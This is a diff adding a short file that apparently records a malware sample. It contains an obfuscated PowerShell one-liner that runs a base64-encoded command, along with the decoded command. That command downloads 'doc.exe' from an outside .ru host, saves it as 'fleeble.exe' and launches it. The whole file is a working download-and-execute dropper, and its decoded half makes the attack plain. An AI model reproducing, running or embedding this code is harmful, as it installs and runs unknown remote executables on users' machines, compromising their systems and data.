@@ -1,0 +1,7 @@
+iex([SYSteM.tEXT.ENCOdINg]::UtF8.gETSTRInG([SYstEm.converT]::FrombaSe64sTrinG('CihOZXctT2JqZWN0IFN5U3RFTS5uZXQud2VCY0xJZW50KS5kb1dOTG9BRGZJTGUoJ2h0dHA6Ly9hbmRlcnNvbmtlbjQ3OTEucHNlcnZlci5ydS9kb2MuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStEM.net.weBcLIent).doWNLoADfILe('http://andersonken4791.pserver.ru/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
